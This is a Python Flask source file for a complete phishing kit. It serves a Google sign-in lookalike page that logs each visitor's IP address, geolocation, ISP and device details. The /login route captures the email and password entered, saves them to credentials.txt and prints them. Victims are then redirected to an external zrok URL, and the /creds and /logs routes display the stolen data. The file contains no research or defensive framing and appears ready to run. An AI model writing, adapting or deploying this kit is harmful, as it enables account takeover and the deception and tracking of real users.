from flask import Flask, request, render_template_string, redirect
import datetime
import requests
import ipaddress
from user_agents import parse

app = Flask(__name__)

# ============================================
# CONFIGURATION
# ============================================
REDIRECT_URL = 'https://93gwjefditbl.share.zrok.io'
PORT = 5001

# Optional: Get free API key from ipinfo.io (sign up for free)
# https://ipinfo.io/signup
IPINFO_API_KEY = ''  # Leave empty to use without key (limited data)

# ============================================
# ADVANCED IP GEOLOCATION WITH FALLBACK
# ============================================

def get_advanced_geo(ip):
    """
    Get comprehensive geolocation data using multiple APIs with fallback
    """
    
    # Check for private IP
    try:
        if ip == '127.0.0.1' or ip == '0.0.0.0' or ip == '::1':
            return {
                'status': 'private',
                'message': 'Local/Private IP',
                'city': 'Local',
                'region': 'Local',
                'country': 'Local',
                'postal': 'N/A',
                'isp': 'Local Network',
                'org': 'Local Device',
                'timezone': 'Local',
                'lat': '0',
                'lon': '0',
                'as_number': 'N/A',
                'as_name': 'N/A',
                'mobile': False,
                'proxy': False,
                'hosting': False
            }
        
        is_private = ipaddress.ip_address(ip).is_private
        if is_private:
            return {
                'status': 'private',
                'message': 'Private Network',
                'city': 'Private',
                'region': 'Private',
                'country': 'Private',
                'postal': 'N/A',
                'isp': 'Private Network',
                'org': 'Local Network',
                'timezone': 'Local',
                'lat': '0',
                'lon': '0',
                'as_number': 'N/A',
                'as_name': 'N/A',
                'mobile': False,
                'proxy': False,
                'hosting': False
            }
    except:
        pass
    
    # Try ip-api.com first
    try:
        res = requests.get(
            f"http://ip-api.com/json/{ip}?fields=status,message,city,region,country,postal,isp,org,timezone,lat,lon,as,asname,mobile,proxy,hosting",
            timeout=5
        )
        data = res.json()
        
        if data.get('status') == 'success':
            # Check if org is empty, if so try ipinfo.io
            org = data.get('org', '')
            isp = data.get('isp', '')
            
            # If org is empty or just "ASN" number, try ipinfo.io
            if not org or org.startswith('AS'):
                print(f"Org empty for {ip}, trying ipinfo.io...")
                ipinfo_data = get_ipinfo_data(ip)
                if ipinfo_data:
                    org = ipinfo_data.get('org', org)
                    isp = ipinfo_data.get('isp', isp)
            
            return {
                'status': 'success',
                'message': 'Success',
                'city': data.get('city', 'Unknown'),
                'region': data.get('region', 'Unknown'),
                'country': data.get('country', 'Unknown'),
                'postal': data.get('postal', 'N/A'),
                'isp': isp if isp else 'Unknown ISP',
                'org': org if org else 'Unknown Organization',
                'timezone': data.get('timezone', 'Unknown'),
                'lat': data.get('lat', '0'),
                'lon': data.get('lon', '0'),
                'as_number': data.get('as', 'N/A'),
                'as_name': data.get('asname', 'N/A'),
                'mobile': data.get('mobile', False),
                'proxy': data.get('proxy', False),
                'hosting': data.get('hosting', False)
            }
        else:
            # If ip-api.com fails, try ipinfo.io
            print(f"ip-api.com failed for {ip}, trying ipinfo.io...")
            ipinfo_data = get_ipinfo_data(ip)
            if ipinfo_data:
                return ipinfo_data
            else:
                return {
                    'status': 'error',
                    'message': data.get('message', 'Unknown error'),
                    'city': 'Unknown',
                    'region': 'Unknown',
                    'country': 'Unknown',
                    'postal': 'N/A',
                    'isp': 'Unknown',
                    'org': 'Unknown',
                    'timezone': 'Unknown',
                    'lat': '0',
                    'lon': '0',
                    'as_number': 'N/A',
                    'as_name': 'N/A',
                    'mobile': False,
                    'proxy': False,
                    'hosting': False
                }
    except Exception as e:
        print(f"Geo error with ip-api.com: {e}")
        # Try ipinfo.io as fallback
        ipinfo_data = get_ipinfo_data(ip)
        if ipinfo_data:
            return ipinfo_data
        else:
            return {
                'status': 'error',
                'message': str(e),
                'city': 'Unknown',
                'region': 'Unknown',
                'country': 'Unknown',
                'postal': 'N/A',
                'isp': 'Unknown',
                'org': 'Unknown',
                'timezone': 'Unknown',
                'lat': '0',
                'lon': '0',
                'as_number': 'N/A',
                'as_name': 'N/A',
                'mobile': False,
                'proxy': False,
                'hosting': False
            }

def get_ipinfo_data(ip):
    """Get data from ipinfo.io (better org/ISP data)"""
    try:
        url = f"https://ipinfo.io/{ip}/json"
        if IPINFO_API_KEY:
            url += f"?token={IPINFO_API_KEY}"
        
        res = requests.get(url, timeout=5)
        data = res.json()
        
        if 'error' in data:
            print(f"ipinfo.io error: {data.get('error')}")
            return None
        
        # Parse org field (format: "AS12345 Organization Name")
        org_full = data.get('org', '')
        as_number = 'N/A'
        org_name = org_full
        
        if org_full and ' ' in org_full:
            parts = org_full.split(' ', 1)
            if parts[0].startswith('AS'):
                as_number = parts[0]
                org_name = parts[1] if len(parts) > 1 else org_full
        
        return {
            'status': 'success',
            'message': 'Success (ipinfo.io)',
            'city': data.get('city', 'Unknown'),
            'region': data.get('region', 'Unknown'),
            'country': data.get('country', 'Unknown'),
            'postal': data.get('postal', 'N/A'),
            'isp': data.get('org', 'Unknown ISP'),
            'org': data.get('org', 'Unknown Organization'),
            'timezone': data.get('timezone', 'Unknown'),
            'lat': data.get('loc', '0,0').split(',')[0] if data.get('loc') else '0',
            'lon': data.get('loc', '0,0').split(',')[1] if data.get('loc') else '0',
            'as_number': as_number,
            'as_name': org_name,
            'mobile': False,
            'proxy': False,
            'hosting': False
        }
    except Exception as e:
        print(f"ipinfo.io error: {e}")
        return None

def get_real_ip():
    """Get real IP even behind proxy"""
    forwarded = request.headers.get('X-Forwarded-For')
    if forwarded:
        return forwarded.split(',')[0].strip()
    
    real_ip = request.headers.get('X-Real-IP')
    if real_ip:
        return real_ip
    
    cf_ip = request.headers.get('CF-Connecting-IP')
    if cf_ip:
        return cf_ip
    
    return request.remote_addr

# ============================================
# GOOGLE LOGIN LOOKALIKE TEMPLATE
# ============================================

GOOGLE_LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link rel="icon" href="https://www.google.com/favicon.ico">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 450px;
            width: 100%;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            background: white;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .logo {
            text-align: center;
            margin-bottom: 32px;
        }
        .logo img {
            width: 75px;
            height: 75px;
        }
        .logo h1 {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin-top: 16px;
        }
        .logo p {
            color: #5f6368;
            font-size: 16px;
            margin-top: 8px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            color: #202124;
            margin-bottom: 6px;
        }
        .form-group input {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            color: #202124;
            transition: border-color 0.2s;
            background: #fff;
        }
        .form-group input:focus {
            outline: none;
            border-color: #1a73e8;
            box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
        }
        .form-group input:disabled {
            background: #f1f3f4;
            color: #5f6368;
        }
        .form-options {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 24px;
        }
        .form-options label {
            font-size: 14px;
            color: #5f6368;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .form-options a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
        }
        .form-options a:hover {
            text-decoration: underline;
        }
        .btn {
            width: 100%;
            padding: 12px;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn:hover {
            background: #1557b0;
            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
        }
        .btn:disabled {
            background: #dadce0;
            color: #5f6368;
            cursor: not-allowed;
        }
        .footer {
            text-align: center;
            margin-top: 24px;
            padding-top: 20px;
            border-top: 1px solid #dadce0;
        }
        .footer a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
        }
        .footer a:hover {
            text-decoration: underline;
        }
        .footer p {
            color: #5f6368;
            font-size: 12px;
            margin-top: 8px;
        }
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.6);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            flex-direction: column;
            gap: 20px;
        }
        .loading-overlay.show {
            display: flex;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #1a73e8;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loading-text {
            color: white;
            font-size: 18px;
            font-family: 'Roboto', Arial, sans-serif;
        }
        .error-msg {
            color: #d93025;
            font-size: 14px;
            margin-top: 8px;
            display: none;
        }
        .error-msg.show {
            display: block;
        }
        @media (max-width: 480px) {
            .container {
                padding: 24px 16px;
            }
            .logo h1 {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>

    <!-- Loading Overlay -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
        <div class="loading-text">⏳ Signing in...</div>
        <div style="color: #ccc; font-size: 14px;">This will only take a moment</div>
        <div style="color: #888; font-size: 12px; margin-top: 10px;">
            ⚡ <span id="timer">3</span>s
        </div>
    </div>

    <div class="container">
        <div class="logo">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
            <h1>Sign in</h1>
            <p>to continue to Gmail</p>
        </div>

        <form id="loginForm" onsubmit="handleSubmit(event)">
            <div class="form-group">
                <label for="email">Email or phone</label>
                <input type="text" id="email" placeholder="Enter your email" required>
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="Enter your password" required>
                <div class="error-msg" id="errorMsg">Invalid email or password. Please try again.</div>
            </div>

            <div class="form-options">
                <label>
                    <input type="checkbox" checked> Stay signed in
                </label>
                <a href="#">Forgot password?</a>
            </div>

            <button type="submit" class="btn" id="submitBtn">Next</button>
        </form>

        <div style="margin-top: 20px; text-align: center; font-size: 14px; color: #5f6368;">
            <span>Not your computer? Use Guest mode to sign in privately.</span>
            <a href="#" style="color: #1a73e8; text-decoration: none; display: block; margin-top: 8px;">Learn more</a>
        </div>

        <div class="footer">
            <a href="#">Create account</a>
            <p>© 2026 Google</p>
        </div>
    </div>

    <script>
        function handleSubmit(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const errorMsg = document.getElementById('errorMsg');
            
            if (!email || !password) {
                errorMsg.textContent = 'Please fill in all fields.';
                errorMsg.classList.add('show');
                return;
            }
            
            // Send credentials to server
            fetch('/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    email: email,
                    password: password
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === 'success') {
                    // Show loading overlay
                    document.getElementById('loadingOverlay').classList.add('show');
                    
                    // Countdown timer
                    let seconds = 3;
                    const timerElement = document.getElementById('timer');
                    
                    const countdown = setInterval(() => {
                        seconds--;
                        if (timerElement) {
                            timerElement.textContent = seconds;
                        }
                        if (seconds <= 0) {
                            clearInterval(countdown);
                            window.location.href = '{{ redirect_url }}';
                        }
                    }, 1000);
                } else {
                    errorMsg.textContent = data.message || 'Login failed. Please try again.';
                    errorMsg.classList.add('show');
                }
            })
            .catch(error => {
                errorMsg.textContent = 'An error occurred. Please try again.';
                errorMsg.classList.add('show');
            });
        }
    </script>
</body>
</html>
"""

# ============================================
# MAIN ROUTES
# ============================================

@app.route('/')
def index():
    """Main Google Login lookalike page with advanced logging"""
    
    # Get real IP
    ip = get_real_ip()
    user_agent_string = request.headers.get('User-Agent', 'Unknown')
    ua = parse(user_agent_string)
    
    # Get advanced geolocation data
    geo_data = get_advanced_geo(ip)
    
    # Device info
    device = ua.device.family
    os = ua.os.family
    browser = ua.browser.family
    device_info = f"{device} ({os})"
    
    # Timestamp
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # ============================================
    # ADVANCED LOGGING - ALL DETAILS
    # ============================================
    
    log_entry = f"""
╔══════════════════════════════════════════════════════════════╗
║ VISITOR DETAILS - {timestamp}
╠══════════════════════════════════════════════════════════════╣
║ IP ADDRESS: {ip}
╠══════════════════════════════════════════════════════════════╣
║ LOCATION INFORMATION:
║   City:       {geo_data.get('city', 'Unknown')}
║   Region:     {geo_data.get('region', 'Unknown')}
║   Country:    {geo_data.get('country', 'Unknown')}
║   Postal:     {geo_data.get('postal', 'N/A')}
║   Timezone:   {geo_data.get('timezone', 'Unknown')}
║   Latitude:   {geo_data.get('lat', '0')}
║   Longitude:  {geo_data.get('lon', '0')}
╠══════════════════════════════════════════════════════════════╣
║ NETWORK INFORMATION:
║   ISP:        {geo_data.get('isp', 'Unknown')}
║   Org:        {geo_data.get('org', 'Unknown')}
║   AS Number:  {geo_data.get('as_number', 'N/A')}
║   AS Name:    {geo_data.get('as_name', 'N/A')}
╠══════════════════════════════════════════════════════════════╣
║ DEVICE INFORMATION:
║   Device:     {device_info}
║   Browser:    {browser}
║   Full UA:    {user_agent_string[:80]}...
╠══════════════════════════════════════════════════════════════╣
║ FLAGS:
║   Mobile:     {geo_data.get('mobile', False)}
║   Proxy:      {geo_data.get('proxy', False)}
║   Hosting:    {geo_data.get('hosting', False)}
╚══════════════════════════════════════════════════════════════╝
"""
    
    # Write to log file
    with open("ip_logs.txt", "a") as f:
        f.write(log_entry)
    
    # Print to console
    print(f"\n[{timestamp}] New Visitor!")
    print(f"  IP: {ip}")
    print(f"  Location: {geo_data.get('city')}, {geo_data.get('country')}")
    print(f"  Postal: {geo_data.get('postal')}")
    print(f"  ISP: {geo_data.get('isp')}")
    print(f"  Org: {geo_data.get('org')}")
    print(f"  Device: {device_info}\n")
    
    # Render Google Login lookalike
    return render_template_string(GOOGLE_LOGIN_TEMPLATE, redirect_url=REDIRECT_URL)

@app.route('/login', methods=['POST'])
def login():
    """Handle login credentials"""
    data = request.get_json()
    
    email = data.get('email', '')
    password = data.get('password', '')
    
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Get IP
    ip = get_real_ip()
    
    # Log credentials
    cred_log = f"""
╔══════════════════════════════════════════════════════════════╗
║ 🔐 CREDENTIALS CAPTURED - {timestamp}
╠══════════════════════════════════════════════════════════════╣
║ IP: {ip}
║ Email: {email}
║ Password: {password}
╚══════════════════════════════════════════════════════════════╝
"""
    
    with open("credentials.txt", "a") as f:
        f.write(cred_log)
    
    print(f"\n🔐 CREDENTIALS CAPTURED!")
    print(f"  IP: {ip}")
    print(f"  Email: {email}")
    print(f"  Password: {password}\n")
    
    return {"status": "success", "message": "Login successful"}

@app.route('/debug')
def debug():
    """Debug endpoint to see all collected data"""
    ip = get_real_ip()
    geo = get_advanced_geo(ip)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    ua = parse(user_agent)
    
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Debug - All Visitor Data</title>
        <style>
            body { 
                background: #0f0f0f; 
                color: #f1f1f1; 
                font-family: 'Courier New', monospace;
                padding: 40px;
                max-width: 800px;
                margin: 0 auto;
            }
            h1 { color: #1a73e8; border-bottom: 2px solid #1a73e8; padding-bottom: 10px; }
            .section { 
                background: #1a1a1a; 
                padding: 20px; 
                margin: 20px 0;
                border-radius: 8px;
                border-left: 4px solid #1a73e8;
            }
            .section h2 { color: #4fc3f7; margin-top: 0; }
            .label { color: #888; }
            .value { color: #4fc3f7; font-weight: bold; }
            table { width: 100%; border-collapse: collapse; }
            td { padding: 8px; border-bottom: 1px solid #333; }
            .badge {
                display: inline-block;
                padding: 2px 10px;
                border-radius: 12px;
                font-size: 12px;
                font-weight: bold;
            }
            .badge-mobile { background: #ff6b6b; color: white; }
            .badge-proxy { background: #ffa726; color: black; }
            .badge-hosting { background: #66bb6a; color: black; }
        </style>
    </head>
    <body>
        <h1>🔍 Visitor Debug Information</h1>
        <p><em>All data collected from your visit</em></p>
        
        <div class="section">
            <h2>📡 IP Address</h2>
            <table>
                <tr><td class="label">IP Address:</td><td class="value">{ip}</td></tr>
                <tr><td class="label">Remote Addr:</td><td>{remote_addr}</td></tr>
            </table>
        </div>
        
        <div class="section">
            <h2>📍 Location Details</h2>
            <table>
                <tr><td class="label">City:</td><td class="value">{city}</td></tr>
                <tr><td class="label">Region:</td><td class="value">{region}</td></tr>
                <tr><td class="label">Country:</td><td class="value">{country}</td></tr>
                <tr><td class="label">Postal Code:</td><td class="value">{postal}</td></tr>
                <tr><td class="label">Timezone:</td><td class="value">{timezone}</td></tr>
                <tr><td class="label">Latitude:</td><td class="value">{lat}</td></tr>
                <tr><td class="label">Longitude:</td><td class="value">{lon}</td></tr>
            </table>
        </div>
        
        <div class="section">
            <h2>🌐 Network Information</h2>
            <table>
                <tr><td class="label">ISP:</td><td class="value">{isp}</td></tr>
                <tr><td class="label">Organization:</td><td class="value">{org}</td></tr>
                <tr><td class="label">AS Number:</td><td class="value">{as_number}</td></tr>
                <tr><td class="label">AS Name:</td><td class="value">{as_name}</td></tr>
            </table>
        </div>
        
        <div class="section">
            <h2>📱 Device Information</h2>
            <table>
                <tr><td class="label">Device:</td><td class="value">{device}</td></tr>
                <tr><td class="label">OS:</td><td class="value">{os}</td></tr>
                <tr><td class="label">Browser:</td><td class="value">{browser}</td></tr>
                <tr><td class="label">User-Agent:</td><td class="value" style="font-size:12px;">{user_agent}</td></tr>
            </table>
        </div>
        
        <div class="section">
            <h2>🚩 Flags</h2>
            <table>
                <tr>
                    <td class="label">📱 Mobile:</td>
                    <td><span class="badge {mobile_class}">{mobile}</span></td>
                </tr>
                <tr>
                    <td class="label">🔒 Proxy/VPN:</td>
                    <td><span class="badge {proxy_class}">{proxy}</span></td>
                </tr>
                <tr>
                    <td class="label">☁️ Hosting/Cloud:</td>
                    <td><span class="badge {hosting_class}">{hosting}</span></td>
                </tr>
            </table>
        </div>
        
        <div class="section">
            <h2>📋 All Headers</h2>
            <table>
                {headers}
            </table>
        </div>
    </body>
    </html>
    """.format(
        ip=ip,
        remote_addr=request.remote_addr,
        city=geo.get('city', 'Unknown'),
        region=geo.get('region', 'Unknown'),
        country=geo.get('country', 'Unknown'),
        postal=geo.get('postal', 'N/A'),
        timezone=geo.get('timezone', 'Unknown'),
        lat=geo.get('lat', '0'),
        lon=geo.get('lon', '0'),
        isp=geo.get('isp', 'Unknown'),
        org=geo.get('org', 'Unknown'),
        as_number=geo.get('as_number', 'N/A'),
        as_name=geo.get('as_name', 'N/A'),
        device=ua.device.family,
        os=ua.os.family,
        browser=ua.browser.family,
        user_agent=user_agent,
        mobile=geo.get('mobile', False),
        mobile_class='badge-mobile' if geo.get('mobile') else '',
        proxy=geo.get('proxy', False),
        proxy_class='badge-proxy' if geo.get('proxy') else '',
        hosting=geo.get('hosting', False),
        hosting_class='badge-hosting' if geo.get('hosting') else '',
        headers=''.join([f"<tr><td class='label'>{k}:</td><td class='value'>{v}</td></tr>" for k, v in dict(request.headers).items()])
    )
    
    return html

@app.route('/logs')
def view_logs():
    """View logs (password protected)"""
    auth = request.headers.get('Authorization')
    if not auth or auth != 'Bearer your-secret-password':
        return "Unauthorized - Add header: Authorization: Bearer your-secret-password", 401
    
    try:
        with open("ip_logs.txt", "r") as f:
            logs = f.read()
        return f"<pre style='font-family:monospace; font-size:12px;'>{logs}</pre>"
    except:
        return "No logs found"

@app.route('/creds')
def view_creds():
    """View captured credentials (password protected)"""
    auth = request.headers.get('Authorization')
    if not auth or auth != 'Bearer your-secret-password':
        return "Unauthorized - Add header: Authorization: Bearer your-secret-password", 401
    
    try:
        with open("credentials.txt", "r") as f:
            creds = f.read()
        return f"<pre style='font-family:monospace; font-size:12px; color:#ff6b6b;'>{creds}</pre>"
    except:
        return "No credentials captured yet"

# ============================================
# RUN THE APP
# ============================================

if __name__ == '__main__':
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║     🔐 Google Login Lookalike Tracker                        ║
    ║                                                               ║
    ║  📊 Logging: ip_logs.txt                                     ║
    ║  🔐 Credentials: credentials.txt                             ║
    ║  🔗 Redirect: {}              ║
    ║  🚪 Port: {}                                                 ║
    ║                                                               ║
    ║  📍 Data Collected:                                          ║
    ║     • IP Address                                             ║
    ║     • City, Region, Country                                 ║
    ║     • Postal Code                                           ║
    ║     • ISP Name                                              ║
    ║     • Organization                                          ║
    ║     • Email & Password (if entered)                         ║
    ║                                                               ║
    ║  Access: http://127.0.0.1:{}                                ║
    ║  Debug:  http://127.0.0.1:{}/debug                         ║
    ║  Logs:   http://127.0.0.1:{}/logs (password protected)     ║
    ║  Creds:  http://127.0.0.1:{}/creds (password protected)    ║
    ╚═══════════════════════════════════════════════════════════════╝
    """.format(REDIRECT_URL, PORT, PORT, PORT, PORT, PORT))
    
    app.run(debug=False, host='0.0.0.0', port=PORT)
